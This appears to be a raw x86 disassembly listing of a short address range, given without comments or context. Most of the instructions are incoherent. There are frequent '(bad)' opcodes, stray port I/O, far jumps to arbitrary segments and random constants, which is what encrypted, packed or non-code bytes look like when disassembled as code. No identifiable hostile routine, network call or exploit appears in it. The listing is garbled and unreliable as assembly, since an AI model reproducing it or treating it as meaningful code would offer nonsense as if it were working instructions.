  40bafe:	pop    esi
  40baff:	push   edi
  40bb00:	pop    edi
  40bb01:	mov    ?,WORD PTR [esi+edi*4+0x560d0724]
  40bb08:	sbb    BYTE PTR [ebp+0x2f],cl
  40bb0b:	lock xchg BYTE PTR [edi-0x78398fd6],ah
  40bb12:	fst    DWORD PTR [esi]
  40bb14:	pop    ebx
  40bb15:	int3   
  40bb16:	daa    
  40bb17:	or     al,0xc0
  40bb19:	cmp    al,0x58
  40bb1b:	jmp    0x40bb8c
  40bb1d:	(bad)  
  40bb1e:	mov    ah,0x76
  40bb20:	and    ch,cl
  40bb22:	add    al,BYTE PTR [edx-0x4]
  40bb25:	cmp    eax,0x5dbef365
  40bb2a:	mov    dh,0xf6
  40bb2c:	sbb    DWORD PTR [ecx],ecx
  40bb2e:	mov    ds:0x69f4df01,al
  40bb33:	or     eax,DWORD PTR [ebx+eiz*8]
  40bb36:	pop    ss
  40bb37:	(bad)  
  40bb38:	push   ecx
  40bb39:	dec    esp
  40bb3a:	push   ebx
  40bb3b:	stos   BYTE PTR es:[edi],al
  40bb3c:	inc    ecx
  40bb3d:	aas    
  40bb3e:	add    al,0x4
  40bb40:	lods   eax,DWORD PTR ds:[esi]
  40bb41:	retf   0xea38
  40bb44:	mov    DWORD PTR [edi+0x1f213bf2],ebx
  40bb4a:	inc    ebp
  40bb4b:	shl    dh,cl
  40bb4d:	xchg   esi,eax
  40bb4e:	push   es
  40bb4f:	imul   edx,DWORD PTR [edx-0x7b5b6576],0xde7ad193
  40bb59:	shrd   DWORD PTR [edx+0x66],esp,cl
  40bb5d:	inc    edx
  40bb5e:	outs   dx,BYTE PTR ds:[esi]
  40bb5f:	cmc    
  40bb60:	(bad)  
  40bb61:	popf   
  40bb62:	add    dh,bh
  40bb64:	imul   ebp,DWORD PTR [eax+0x5860a482],0xffffffb3
  40bb6b:	push   esi
  40bb6c:	xchg   esi,eax
  40bb6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb6e:	aaa    
  40bb6f:	fisttp WORD PTR [eax-0x3]
  40bb72:	fmul   st(5),st
  40bb74:	xlat   BYTE PTR ds:[ebx]
  40bb75:	cdq    
  40bb76:	lea    eax,[edx-0x6f]
  40bb79:	ja     0x40bb00
  40bb7b:	loop   0x40bb18
  40bb7d:	pop    ebx
  40bb7e:	test   BYTE PTR [edx],ah
  40bb80:	in     al,0x9d
  40bb82:	jl     0x40bb39
  40bb84:	push   esp
  40bb85:	cmp    bl,BYTE PTR [edx-0x370a22ee]
  40bb8b:	mov    ah,0x49
  40bb8d:	mov    WORD PTR [esi+eax*4],?
  40bb90:	fcomp  st(6)
  40bb92:	push   0x58
  40bb94:	xchg   esp,eax
  40bb95:	push   esp
  40bb96:	add    edi,DWORD PTR [ebx]
  40bb98:	inc    edi
  40bb99:	or     eax,ebp
  40bb9b:	push   edi
  40bb9c:	gs data16 js 0x40bbb2
  40bba0:	dec    eax
  40bba1:	in     al,0x20
  40bba3:	das    
  40bba4:	cmp    al,0x88
  40bba6:	jmp    DWORD PTR [ecx+0x2e]
  40bba9:	dec    esp
  40bbaa:	fwait
  40bbab:	push   ds
  40bbac:	cmp    al,0x3b
  40bbae:	sbb    al,0xce
  40bbb0:	repz inc esp
  40bbb2:	mov    es,WORD PTR [ecx]
  40bbb4:	fcmovnbe st,st(4)
  40bbb6:	sbb    edi,ecx
  40bbb8:	pop    ebp
  40bbb9:	inc    edi
  40bbba:	dec    esp
  40bbbb:	xchg   di,ax
  40bbbd:	sub    DWORD PTR [eax],esi
  40bbbf:	call   0x3649fffd
  40bbc4:	push   0x5a3aee96
  40bbc9:	jns    0x40bbba
  40bbcb:	in     eax,0x69
  40bbcd:	xor    esp,DWORD PTR [eax]
  40bbcf:	add    bh,BYTE PTR [edx]
  40bbd1:	fucom  st(1)
  40bbd3:	in     eax,0x97
  40bbd5:	dec    edx
  40bbd6:	mov    dl,BYTE PTR [edx]
  40bbd8:	shl    BYTE PTR [ebx],1
  40bbda:	(bad)  
  40bbdb:	pop    edi
  40bbdc:	xor    DWORD PTR [eax],0xffffff8f
  40bbdf:	std    
  40bbe0:	mov    edx,0x2c692e1e
  40bbe5:	add    BYTE PTR [ebx],0x64
  40bbe8:	inc    edi
  40bbe9:	les    ecx,FWORD PTR [ebx+ecx*4+0x30]
  40bbed:	ins    DWORD PTR es:[edi],dx
  40bbee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbef:	push   ebx
  40bbf0:	mov    ds:0xc11d0c44,eax
  40bbf5:	and    cl,dh
  40bbf7:	fcomp  DWORD PTR [eax+edi*4+0x28]
  40bbfb:	in     al,0x44
  40bbfd:	dec    al
  40bbff:	cdq    
  40bc00:	sub    DWORD PTR [edi+0x2d690833],ebp
  40bc06:	push   eax
  40bc07:	or     BYTE PTR [edx+0x4d],bh
  40bc0a:	icebp  
  40bc0b:	xchg   esp,eax
  40bc0d:	mov    dl,0xf4
  40bc0f:	mov    ah,0x48
  40bc11:	lock sub cl,BYTE PTR [ebx+0x4b]
  40bc15:	sub    al,0xac
  40bc17:	mov    fs,WORD PTR [edx-0x4d]
  40bc1a:	mov    esi,0x2c792546
  40bc1f:	popf   
  40bc20:	in     al,0xe1
  40bc22:	pop    cx
  40bc24:	cwde   
  40bc25:	jmp    0x40bc69
  40bc27:	add    BYTE PTR [edi+0x5c],ch
  40bc2a:	call   0x92863407
  40bc2f:	ss add eax,eax
  40bc32:	mov    bl,0x5e
  40bc34:	into   
  40bc35:	jecxz  0x40bc64
  40bc37:	ret    0xc8f6
  40bc3a:	(bad)  
  40bc3c:	(bad)
  40bc3f:	cmp    DWORD PTR [eax],edx
  40bc41:	outs   dx,DWORD PTR ds:[esi]
  40bc42:	jo     0x40bc9b
  40bc44:	mov    esp,0x1356fdac
  40bc49:	mov    bl,0xa5
  40bc4b:	out    0x9d,al
  40bc4d:	jno    0x40bc70
  40bc4f:	outs   dx,DWORD PTR ds:[esi]
  40bc50:	fist   DWORD PTR [edi+0x3aa04e5c]
  40bc56:	xor    edi,DWORD PTR [ebx]
  40bc58:	xchg   esp,eax
  40bc59:	mov    ds:0x94fe3094,eax
  40bc5e:	cmp    eax,0x2579e44b
  40bc63:	fisub  WORD PTR [ebx]
  40bc65:	inc    esi
  40bc66:	push   ebx
  40bc67:	dec    edi
  40bc68:	and    al,0xc3
  40bc6a:	inc    edx
  40bc6b:	lods   al,BYTE PTR ds:[esi]
  40bc6c:	xchg   edi,eax
  40bc6d:	mov    DWORD PTR [esi+0x4e0e4cda],edx
  40bc73:	cmp    dh,BYTE PTR [ebp+0x2f485bbe]
  40bc79:	imul   eax,DWORD PTR [esi+0x64],0x50
  40bc7d:	jmp    0x673c330c
  40bc82:	dec    esp
  40bc83:	outs   dx,BYTE PTR ds:[esi]
  40bc84:	retf   0xb6ef
  40bc87:	pop    esi
  40bc88:	push   es
  40bc89:	rcr    BYTE PTR [edx+0x46db1360],0xe9
  40bc90:	ja     0x40bcb3
  40bc92:	pusha  
  40bc93:	jo     0x40bcc5
  40bc95:	xchg   ebx,eax
  40bc96:	cmp    al,0xbb
  40bc98:	fiadd  DWORD PTR [ebx]
  40bc9a:	add    edx,esi
  40bc9c:	(bad)  
  40bc9d:	sti    
  40bc9e:	ret    0x340c
  40bca1:	xchg   esi,eax
  40bca2:	push   esi
  40bca3:	clc    
  40bca4:	mov    ebx,0xe64b6bd3
  40bca9:	jb     0x40bd08
  40bcab:	fld    DWORD PTR [ebx+0x4a]
  40bcae:	sbb    DWORD PTR [ecx+esi*4-0x61223434],ecx
  40bcb5:	je     0x40bc44
  40bcb7:	in     al,dx
  40bcb8:	pop    edi
  40bcb9:	mov    ds:0xfc082a02,al
  40bcbe:	and    BYTE PTR fs:[di],0x6e
  40bcc3:	or     al,0x3a
  40bcc5:	or     al,0xc6
  40bcc7:	int3   
  40bcc8:	imul   esp,DWORD PTR [edi+0x671e15d1],0xffffffff
  40bccf:	je     0x40bc5f
  40bcd1:	(bad)  
  40bcd2:	jmp    0x54e:0xda658fac
  40bcd9:	aaa    
  40bcda:	inc    edi
  40bcdb:	fs jecxz 0x40bc81
  40bcde:	sbb    al,0xcc
  40bce0:	lods   eax,DWORD PTR ds:[esi]
  40bce1:	push   edx
  40bce2:	(bad)  
  40bce3:	and    al,0xd6
  40bce5:	mov    ebx,0xa5be3f58
  40bcea:	in     eax,dx
  40bceb:	jle    0x40bc94
  40bced:	shr    BYTE PTR [edx],0xfe
  40bcf0:	and    bl,BYTE PTR [esi+ebx*2+0x1ff81310]
  40bcf7:	cli    
  40bcf8:	hlt    
  40bcf9:	jb     0x40bc82
  40bcfb:	add    dh,cl
  40bcfd:	cwde   
  40bcfe:	mov    ?,ebx
  40bd00:	aad    0x19
  40bd02:	adc    al,0x5f
  40bd04:	xchg   esi,eax
  40bd05:	adc    dl,ah
  40bd07:	aas    
  40bd08:	pop    ebp
  40bd09:	je     0x40bcf7
  40bd0b:	xchg   ebp,eax
  40bd0c:	and    al,0x48
  40bd0e:	or     BYTE PTR [edi-0x6b1413c1],ah
  40bd14:	mov    DWORD PTR [edi-0x595ff77b],esi
  40bd1a:	dec    ebx
  40bd1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd1c:	cmp    al,0x51
  40bd1e:	ins    DWORD PTR es:[edi],dx
  40bd1f:	push   0xffffffad
  40bd21:	icebp  
  40bd22:	je     0x40bcb9
  40bd24:	je     0x40bcbb
  40bd26:	push   esi
  40bd27:	sbb    dh,BYTE PTR [ebp+eiz*8+0x57]
  40bd2b:	pop    ebp
  40bd2c:	lods   al,BYTE PTR ds:[esi]
  40bd2d:	outs   dx,BYTE PTR ds:[esi]
  40bd2e:	aad    0x88
  40bd30:	ins    BYTE PTR es:[edi],dx
  40bd31:	hlt    
  40bd32:	inc    edi
  40bd33:	jo     0x40bdb2
  40bd35:	add    BYTE PTR [ecx-0x3b8070be],0x49
  40bd3c:	and    DWORD PTR [edx-0x75ccd841],eax
  40bd42:	popa   
  40bd43:	xchg   edx,eax
  40bd44:	pop    esi
  40bd45:	loop   0x40bd25
  40bd47:	(bad)  
  40bd48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd49:	or     al,0xe9
  40bd4b:	adc    esp,DWORD PTR [esp+ecx*4+0x71]
  40bd4f:	jbe    0x40bce2
  40bd51:	mov    ch,0xd8
  40bd53:	pop    edx
  40bd54:	add    esp,edi
  40bd56:	ja     0x40bd9e
  40bd58:	inc    edi
  40bd59:	fdivp  st(5),st
  40bd5b:	pop    ebp
  40bd5c:	add    al,0xda
  40bd5e:	popa   
  40bd5f:	fwait
  40bd60:	sbb    cl,al
  40bd62:	pop    es
  40bd63:	dec    esi
  40bd64:	and    eax,0xe932d46f
  40bd69:	dec    ecx
  40bd6a:	es ja  0x40bd56
  40bd6d:	or     eax,0x1f3ca98a
  40bd72:	pop    ebx
  40bd73:	cdq    
  40bd74:	outs   dx,BYTE PTR ds:[esi]
  40bd75:	cmp    eax,eax
  40bd77:	enterw 0x85ac,0xb6
  40bd7c:	data16 shl al,cl
  40bd7f:	sti    
  40bd80:	xchg   BYTE PTR [esi],ch
  40bd82:	inc    ecx
  40bd83:	jo     0x40bd33
  40bd85:	pop    eax
  40bd86:	aam    0x70
  40bd88:	ret    0x43ce
  40bd8b:	bound  esi,QWORD PTR [ebx-0x334edebf]
  40bd91:	add    ebp,ebx
  40bd93:	daa    
  40bd94:	cmc    
  40bd95:	xchg   BYTE PTR [eax+0x35e34473],bl
  40bd9b:	cmp    BYTE PTR [eax+0x6b476989],dl
  40bda1:	stc    
  40bda2:	jp     0x40bd86
  40bda4:	and    al,0x4
  40bda6:	int    0x9f
  40bda8:	mov    esi,0x7c1e7af2
  40bdad:	xor    DWORD PTR [edx-0x1a],edi
  40bdb0:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40bdb2:	aaa    
  40bdb3:	or     edi,DWORD PTR fs:[eax+0x49]
  40bdb7:	adc    eax,0x5c01f7db
  40bdbc:	pop    es
  40bdbd:	push   0x4b
  40bdbf:	sti    
  40bdc0:	sub    edi,DWORD PTR [esi+0x1]
  40bdc3:	cmp    DWORD PTR [edx+esi*2-0x73],edx
  40bdc7:	ja     0x40be46
  40bdc9:	mov    ?,WORD PTR [eax]
  40bdcb:	test   DWORD PTR [ebp-0x736223f4],0xd4ab714d
  40bdd5:	aad    0xe6
  40bdd7:	call   0xdc00:0x5c52c03a
  40bdde:	mov    ah,BYTE PTR [ebx-0x63]
  40bde1:	shl    edx,cl
  40bde3:	mov    WORD PTR [esi+0x40],es
  40bde6:	fcomip st,st(3)
  40bde8:	xchg   edx,eax
  40bde9:	add    DWORD PTR [edx],0x2da4c146
  40bdef:	mov    cl,0xc9
  40bdf1:	aas    
  40bdf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdf3:	test   al,0x4d
  40bdf5:	push   esp
  40bdf6:	mov    ds,WORD PTR [edx]
  40bdf8:	nop
  40bdf9:	mov    edx,0x3a09c7bf
  40bdfe:	or     BYTE PTR [esi-0x51c1f329],0x32
  40be05:	adc    ebp,DWORD PTR [edi]
  40be07:	rcl    al,cl
  40be09:	push   esi
  40be0a:	jo     0x40be7a
  40be0c:	and    DWORD PTR [ecx-0x63],esi
  40be0f:	mov    ecx,0xfa24a972
  40be14:	or     al,0xa3
  40be16:	mov    edi,0xfab3b9ed
  40be1b:	cmp    dl,0xf5
  40be1e:	sub    bh,BYTE PTR [ecx+0x147b5830]
  40be24:	out    dx,eax
  40be25:	int    0x17
  40be27:	test   DWORD PTR [eax-0x79cbe215],0x7848b20a
  40be31:	out    0xd1,al
  40be33:	adc    edx,ebx
  40be35:	add    eax,0xd9db65c6
  40be3a:	cdq    
  40be3b:	pop    eax
  40be3c:	jl     0x40bdf3
  40be3e:	push   ebx
  40be3f:	or     al,0xcd
  40be41:	xchg   edx,eax
  40be42:	xor    ah,BYTE PTR [esi+0x5cdeb457]
  40be48:	mov    esp,0x2dcf8f0b
  40be4d:	cmp    al,0xd1
  40be4f:	push   0xf352d2b6
  40be54:	sub    ch,cl
  40be56:	push   eax
  40be57:	adc    ch,BYTE PTR [ebp+0x2a578516]
  40be5d:	retf   
  40be5e:	ret    
  40be5f:	sbb    al,0xf6
  40be61:	xchg   DWORD PTR [esi],esi
  40be63:	dec    edx
  40be64:	mov    dh,0x4b
  40be66:	test   BYTE PTR [eax-0x76613520],0x87
  40be6d:	xor    bh,bh
  40be6f:	in     eax,0x56
  40be71:	jg     0x40be7d
  40be73:	sub    al,0x8a
  40be75:	push   ecx
  40be76:	jp     0x40beaa
  40be78:	icebp  
  40be79:	shl    DWORD PTR es:[eax],1
  40be7c:	cmp    eax,0x8f764cc0
  40be81:	mov    ecx,DWORD PTR ds:[esp+ebx*8-0x22]
  40be86:	dec    ebp
  40be87:	cmp    eax,0x435e3f1f
  40be8c:	es or  eax,0x9d9d6503
  40be92:	pop    ebx
  40be93:	mov    ah,BYTE PTR [edi]
  40be95:	mov    cl,BYTE PTR [ebx]
  40be97:	and    BYTE PTR [edi*1-0x42f36437],0x1d
  40be9f:	jno    0x40be3a
  40bea1:	bound  esi,QWORD PTR [ebp+0x7b]
  40bea4:	xchg   ecx,eax
  40bea5:	nop
  40bea6:	mov    WORD PTR [edi-0x3ec8a77],fs
  40beac:	das    
  40bead:	shl    BYTE PTR [ebx+0x65dc0474],cl
  40beb3:	jle    0x40be5f
  40beb5:	ret    
  40beb6:	push   eax
  40beb7:	push   cs
  40beb8:	and    ebp,DWORD PTR cs:[ecx]
  40bebb:	dec    edx
  40bebc:	or     edx,ecx
  40bebe:	pop    ecx
  40bebf:	lock into 
  40bec1:	adc    al,0x55
  40bec3:	push   esi
  40bec4:	sub    BYTE PTR [ebx],al
  40bec6:	out    dx,eax
  40bec7:	repz cdq 
  40bec9:	rcr    DWORD PTR [ecx+0x68],cl
  40becc:	inc    ebx
  40becd:	push   0x7d66822b
  40bed2:	sub    eax,0x5152ffca
  40bed7:	pop    eax
  40bed8:	push   es
  40bed9:	adc    esp,DWORD PTR [edi-0x55ac1a80]
  40bedf:	jbe    0x40be89
  40bee1:	mov    ebp,0x7fda1144
  40bee6:	sbb    bl,BYTE PTR [edi+eiz*2+0x30fc8d21]
  40beed:	inc    esp
  40beee:	aas    
  40beef:	es (bad) 
  40bef1:	pop    ss
  40bef2:	inc    ebp
  40bef3:	add    eax,0xb3c34c31
  40bef8:	(bad)  
  40bef9:	daa    
  40befa:	mov    ebp,0x5a4a9722
  40beff:	jae    0x40bef6
  40bf01:	push   ebp
  40bf02:	mov    es,WORD PTR [edx-0x13a40687]
  40bf08:	mov    bh,0xec
  40bf0a:	loopne 0x40bedc
  40bf0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf0d:	ja     0x40bf2b
  40bf0f:	and    al,0x23
  40bf11:	shl    BYTE PTR [edx+0x59],cl
  40bf14:	test   eax,0x78fe1054
  40bf19:	add    eax,0x25f2a4a5
  40bf1e:	(bad)  
  40bf1f:	outs   dx,DWORD PTR ds:[esi]
  40bf20:	fld    st(7)
  40bf22:	loop   0x40bf03
  40bf24:	imul   esp,DWORD PTR [esi-0x55],0xfffffff5
  40bf28:	js     0x40bf05
  40bf2a:	adc    eax,DWORD PTR [ebx+edx*1-0x182c1a44]
  40bf31:	xor    BYTE PTR [esi+0x70],bl
  40bf34:	fisub  WORD PTR [esi]
  40bf36:	pop    esi
  40bf37:	ins    BYTE PTR es:[edi],dx
  40bf38:	mov    WORD PTR [ecx+edx*8],es
  40bf3b:	jp     0x40bedf
  40bf3d:	mov    dh,0x0
  40bf3f:	sbb    BYTE PTR [edi-0x3f],bh
  40bf42:	dec    esp
  40bf43:	dec    edi
  40bf44:	fisubr DWORD PTR ds:0x427d4d1d
  40bf4a:	mov    ebp,DWORD PTR [esi-0x5d]
  40bf4d:	inc    ebp
  40bf4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf4f:	cmp    ch,dh
  40bf51:	imul   eax,DWORD PTR [esi+ebp*2-0x2144a43f],0xfffffff1
  40bf59:	ds push ebx
  40bf5b:	pop    es
  40bf5c:	(bad)  
  40bf5d:	jle    0x40bf75
  40bf5f:	nop
  40bf60:	push   ebp
  40bf61:	aad    0x70
  40bf63:	clc    
  40bf64:	jmp    0xc744:0x9d20340
  40bf6b:	imul   eax,eax,0x1e
  40bf6e:	lea    eax,[edi-0x16]
  40bf71:	rcl    DWORD PTR [ebx+0x7508d226],cl
  40bf77:	xchg   esi,eax
  40bf78:	popa   
  40bf79:	xchg   DWORD PTR [ebx-0x3ec52312],edx
  40bf7f:	out    0x64,eax
  40bf81:	lock mov ebx,0x7f3d1e1a
  40bf87:	or     bx,0xff9b
  40bf8b:	ror    BYTE PTR [edi+0xe904ea3],cl
  40bf91:	arpl   WORD PTR [edi+0x25b4d48b],cx
  40bf97:	mov    edi,0xbee91612
  40bf9c:	pop    esi
  40bf9d:	dec    esi
  40bf9e:	fiadd  DWORD PTR [edi-0x6f]
  40bfa1:	push   ecx
  40bfa2:	pusha  
  40bfa3:	adc    edi,DWORD PTR [ecx+ebp*8+0x33]
  40bfa7:	fidiv  WORD PTR [eax+0x1063a01c]
  40bfad:	xacquire xchg BYTE PTR [esi-0x59b6a4f7],bl
  40bfb4:	jnp    0x40bfab
  40bfb6:	clc    
  40bfb7:	nop
  40bfb8:	addr16 loopne 0x40c02a
  40bfbb:	inc    edx
  40bfbc:	pop    eax
  40bfbd:	rcl    DWORD PTR [edi+0x6cf1e320],cl
  40bfc3:	fsub   DWORD PTR [esi-0x369cc400]
  40bfc9:	and    al,0xdf
  40bfcb:	mov    al,0x37
  40bfcd:	ret    
  40bfce:	(bad)  
  40bfcf:	push   cs
  40bfd0:	sbb    edi,DWORD PTR [ebp+0x12]
  40bfd3:	mov    DWORD PTR [edx],esp
  40bfd5:	xor    al,0xe4
  40bfd7:	push   esi
  40bfd8:	shl    BYTE PTR [eax],0xbe
  40bfdb:	inc    edi
  40bfdc:	inc    ebp
  40bfdd:	jae    0x40bffb
  40bfdf:	test   al,0xfa
  40bfe1:	popa   
  40bfe2:	lods   eax,DWORD PTR ds:[esi]
  40bfe3:	rcl    ah,cl
  40bfe5:	dec    eax
  40bfe6:	test   BYTE PTR [ebp-0x1add2ee0],bl
  40bfec:	cld    
  40bfed:	retf   
  40bfee:	mov    bh,0x9
  40bff0:	test   BYTE PTR [ecx+0xb],cl
  40bff3:	adc    bh,0xe
  40bff6:	test   BYTE PTR [ebx-0x7c2af764],ah
  40bffc:	stos   BYTE PTR es:[edi],al
  40bffd:	into   
  40bffe:	jnp    0x40bfde
  40c000:	push   edi
  40c001:	mul    DWORD PTR [ebp+ebx*8+0x69]
  40c005:	clc    
  40c006:	in     eax,0x59
  40c008:	gs pop ebx
  40c00a:	outs   dx,BYTE PTR ds:[esi]
  40c00b:	loopne 0x40c046
  40c00d:	pop    esp
  40c00e:	xor    ch,bl
  40c010:	(bad)  
  40c011:	(bad)  
  40c012:	cdq    
  40c013:	push   esi
  40c014:	push   esi
  40c015:	inc    edi
  40c016:	pop    ebp
  40c017:	(bad)  
  40c019:	pop    ebp
  40c01a:	xchg   ebx,eax
  40c01b:	mov    BYTE PTR [eax-0x87c0099],0xa8
  40c022:	ficom  DWORD PTR [esp+0x30fc44f3]
  40c029:	sbb    al,0xe4
  40c02b:	in     eax,dx
  40c02c:	lock push es
  40c02e:	ds jmp 0xe79c967
  40c034:	pop    ebx
  40c035:	add    ebp,ecx
  40c037:	imul   esi,DWORD PTR [ebp+0x773ca9ea],0xf972b5b9
  40c041:	int3   
  40c042:	ins    BYTE PTR es:[edi],dx
  40c043:	dec    ebx
  40c044:	repz jns 0x40c080
  40c047:	ret    0xb89f
  40c04a:	mov    ds:0xd893450,eax
  40c04f:	rcr    BYTE PTR [edx+0x66],0xe4
  40c053:	shl    DWORD PTR [ebp-0x1cb7bbfd],1
  40c059:	push   cs
  40c05a:	popf   
  40c05b:	ins    BYTE PTR es:[edi],dx
  40c05c:	dec    edx
  40c05d:	bound  edi,QWORD PTR [esi]
  40c05f:	jmp    0x8202:0xe941b466
  40c066:	dec    eax
  40c067:	pusha  
  40c068:	xor    al,0xd2
  40c06a:	sbb    DWORD PTR [ebx],ebp
  40c06c:	and    eax,0x24a79e1
  40c071:	(bad)  
  40c072:	sub    dh,BYTE PTR [esi-0x56]
  40c075:	(bad)  
  40c076:	aam    0xfc
  40c078:	cld    
  40c079:	mov    ecx,0x7db1c696
  40c07e:	push   edi
  40c07f:	jl     0x40c0ea
  40c081:	(bad)  
  40c082:	jecxz  0x40c033
  40c084:	mov    ds:0xb8e89cf9,al
  40c089:	ror    BYTE PTR [ecx],0xaf
  40c08c:	mov    esp,0x7900d5d7
  40c091:	mov    esi,0x6edb19a5
  40c096:	mov    al,ds:0x51be4302
  40c09b:	fidivr DWORD PTR [ecx+0x6a]
  40c09e:	jmp    0x59d03a97
  40c0a3:	and    DWORD PTR [ebp+0x42],ebx
  40c0a6:	mov    bl,0x25
  40c0a8:	push   esp
  40c0a9:	mov    dl,0x67
  40c0ab:	mov    bl,0xd4
  40c0ad:	mov    eax,0xef180366
  40c0b2:	inc    edi
  40c0b3:	add    eax,0x6421930b
  40c0b8:	test   edi,esi
  40c0ba:	mov    al,0x92
  40c0bc:	pop    ss
  40c0bd:	and    BYTE PTR ds:0x320e8a18,0xdb
  40c0c4:	out    0xeb,al
  40c0c6:	pop    eax
  40c0c7:	push   0xfffffff9
  40c0c9:	sbb    eax,0x5c875f67
  40c0ce:	jns    0x40c0a8
  40c0d0:	jae    0x40c0e3
  40c0d2:	ss mov edi,0xe8af5869
  40c0d8:	das    
  40c0d9:	dec    eax
  40c0da:	retf   
  40c0db:	push   ebx
  40c0dc:	(bad)  
  40c0dd:	lahf   
  40c0de:	dec    eax
  40c0df:	test   ah,bl
  40c0e1:	pop    esp
  40c0e2:	jmp    0xb2c595c5
  40c0e7:	clc    
  40c0e8:	push   eax
  40c0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0ea:	rol    DWORD PTR [edi+0x30dfc58a],1
  40c0f0:	cmp    al,0x91
  40c0f2:	stos   BYTE PTR es:[edi],al
  40c0f3:	test   BYTE PTR [esi+0x59],0xcd
  40c0f7:	test   eax,0x2b3de62a
  40c0fc:	adc    DWORD PTR [ebx],esp
  40c0fe:	mov    eax,ds:0x3b9eb686
  40c103:	enter  0xed7f,0xc5
  40c107:	and    ch,BYTE PTR [eax]
  40c109:	and    eax,0x4ddcee75
  40c10e:	push   esi
  40c10f:	sub    BYTE PTR [eax-0x3b],0x4a
  40c113:	sar    BYTE PTR [edx-0x49],cl
  40c116:	sub    BYTE PTR [edx+0x0],bl
  40c119:	xchg   ecx,eax
  40c11a:	cs stos DWORD PTR es:[edi],eax
  40c11c:	sar    BYTE PTR [ebp+0x1c64cd76],0x39
  40c123:	inc    edi
  40c124:	xor    al,BYTE PTR [edi]
  40c126:	cli    
  40c127:	test   al,0xe
  40c129:	js     0x40c163
  40c12b:	sbb    al,0x30
  40c12d:	or     al,0x28
  40c12f:	mov    fs,edx
  40c131:	jg     0x40c161
  40c133:	outs   dx,DWORD PTR ds:[esi]
  40c134:	xchg   esp,eax
  40c135:	test   cl,0x6e
  40c138:	push   ebp
  40c139:	ja     0x40c111
  40c13b:	(bad)  
  40c13c:	div    DWORD PTR [ecx]
  40c13e:	fist   DWORD PTR [esi-0x6d712dd0]
  40c144:	cmp    ah,BYTE PTR [esi]
  40c146:	ror    ecx,1
  40c148:	cmp    eax,0x530b16ff
  40c14d:	add    ah,ch
  40c14f:	add    cl,BYTE PTR ss:[ecx+0x7c]
  40c153:	loopne 0x40c1b1
  40c155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c156:	mov    ch,0xbd
  40c158:	imul   di,dx,0xffd4
  40c15c:	mov    ch,0xc9
  40c15e:	pop    esp
  40c15f:	mov    dh,0x84
  40c161:	mov    WORD PTR ds:0x50a02e2f,ds
  40c167:	sbb    al,0x8f
  40c169:	push   ecx
  40c16a:	or     DWORD PTR [edi-0x2aae4184],esp
  40c170:	sbb    BYTE PTR [ecx-0x7d],0xb1
  40c174:	test   al,0x6
  40c176:	xor    DWORD PTR [eax+0x21b48038],ecx
  40c17c:	or     eax,0xfe9bfc29
  40c181:	cld    
  40c182:	or     edx,esp
  40c184:	test   BYTE PTR [eax+0x52],dh
  40c187:	push   eax
  40c188:	pop    ebp
  40c189:	pop    ecx
  40c18a:	dec    esp
  40c18b:	pusha  
  40c18c:	loopne 0x40c1b2
  40c18e:	into   
  40c18f:	mov    cl,0x96
  40c191:	xor    DWORD PTR [edi+0x4629e0ee],edx
  40c197:	shr    DWORD PTR [eax],cl
  40c199:	mov    ch,0x54
  40c19b:	out    dx,eax
  40c19c:	and    al,0x4e
  40c19e:	sub    ebx,ecx
  40c1a0:	xchg   ecx,eax
  40c1a1:	inc    edx
  40c1a2:	mov    bl,0x1f
  40c1a4:	ins    BYTE PTR es:[edi],dx
  40c1a5:	ins    BYTE PTR es:[edi],dx
  40c1a6:	outs   dx,DWORD PTR ds:[esi]
  40c1a7:	push   0x3a2e765d
  40c1ac:	dec    ebx
  40c1ad:	sbb    eax,0x2a0f4f95
  40c1b2:	mov    edx,0xc8fbbd57
  40c1b7:	mov    ds:0xba381d8,al
  40c1bc:	shl    BYTE PTR [ebx],0x99
  40c1bf:	aad    0xc0
  40c1c1:	xchg   ebx,eax
  40c1c2:	jmp    0x40c1bf
  40c1c4:	cld    
  40c1c5:	xor    DWORD PTR [eax],edi
  40c1c7:	mov    dl,0xa3
  40c1c9:	and    BYTE PTR [edi+0x4f84caf0],bl
  40c1cf:	mov    ah,0x24
  40c1d1:	jmp    0x40c15b
  40c1d3:	test   al,0xa4
  40c1d5:	xchg   edx,eax
  40c1d6:	or     esp,DWORD PTR [edi-0x3]
  40c1d9:	(bad)  
  40c1da:	paddb  mm6,QWORD PTR [ebp+0x2]
  40c1de:	mov    ecx,0x1c0e23c0
  40c1e3:	mov    al,0x5b
  40c1e5:	inc    esp
  40c1e6:	cdq    
  40c1e7:	lahf   
  40c1e8:	ret    0x8ed0
  40c1eb:	sub    edi,DWORD PTR [ebp+0xbfaee6a]
  40c1f1:	sub    DWORD PTR [edi-0x42],eax
  40c1f4:	lods   eax,DWORD PTR ds:[esi]
  40c1f5:	pusha  
  40c1f6:	sub    ah,BYTE PTR [edi+0x66522da2]
  40c1fc:	ja     0x40c1c3
  40c1fe:	push   edx
  40c1ff:	stc    
  40c200:	jmp    0x7721:0x3ddca6c6
  40c207:	add    al,0x66
  40c209:	shl    bl,cl
  40c20b:	fcmovnu st,st(5)
  40c20d:	push   edi
  40c20e:	pop    edi
  40c20f:	cld    
  40c210:	mov    eax,DWORD PTR [ecx-0x2]
  40c213:	pause  
  40c215:	jns    0x40c235
  40c217:	les    edx,FWORD PTR [ebp-0x2951d546]
  40c21d:	js     0x40c1c7
  40c21f:	in     al,dx
  40c220:	jle    0x40c232
  40c222:	jmp    0x7f229e8b
  40c227:	dec    ecx
  40c228:	mov    esp,0xd5884466
  40c22d:	ja     0x40c1b1
  40c22f:	adc    eax,0xa0396a7
  40c234:	repnz in eax,0xd
  40c237:	mov    ah,0xaa
  40c239:	lods   al,BYTE PTR ds:[esi]
  40c23a:	fcomi  st,st(6)
  40c23c:	(bad)  
  40c23d:	call   FWORD PTR [ecx+edi*1+0x533d4e2c]
  40c244:	fldenv [ecx+edi*1+0x30]
  40c248:	mov    cl,0x1f
  40c24a:	ja     0x40c274
  40c24c:	dec    edi
  40c24d:	dec    edi
  40c24e:	ret    
